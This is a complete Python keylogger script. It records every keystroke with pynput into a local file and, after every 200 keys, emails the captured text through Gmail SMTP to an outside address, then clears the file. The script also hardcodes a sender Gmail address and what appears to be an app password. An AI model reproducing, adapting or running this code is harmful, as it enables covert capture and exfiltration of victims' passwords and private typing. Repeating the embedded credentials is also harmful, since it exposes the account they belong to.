from pynput.keyboard import Listener
import smtplib
import threading
from email.mime.text import MIMEText
EMAIL_SENDER = "dodanghoan.learn@gmail.com"
EMAIL_PASSWORD = "ycge rbqy ngqw ayhp"  
EMAIL_RECEIVER = "ghuhe98@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
char_count = 0
file_path = 'crack.txt'
LimitKeyLogger = 200
lock = threading.Lock()  
def send_email():
    global char_count
    with lock:
        if char_count < LimitKeyLogger:
            return  
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read().strip()
            if not content:
                return  
            msg = MIMEText(content)
            msg["Subject"] = "Keylogger Data"
            msg["From"] = EMAIL_SENDER
            msg["To"] = EMAIL_RECEIVER
            def send():
                try:
                    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                        server.starttls()
                        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                        server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
                except Exception as e:
                    print("[-] Error sending email:", e)
            email_thread = threading.Thread(target=send, daemon=True)
            email_thread.start()
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write("")
                f.flush()
            char_count = 0  
        except Exception as e:
            print("[-] Error processing email:", e)
def keypress(key):
    global char_count
    key_str = str(key).replace("'", " ")
    if key_str == 'Key.f10':
        raise SystemExit(0)
    if key_str.startswith("Key."):
        key_str = key_str[4:] + " "
    with open(file_path, 'a', encoding='utf-8') as f:
        f.write(key_str)
        f.flush()
    with lock:
        char_count += 1
        if char_count >= LimitKeyLogger:
            threading.Thread(target=send_email, daemon=True).start()
with Listener(on_press=keypress) as obj:
    obj.join()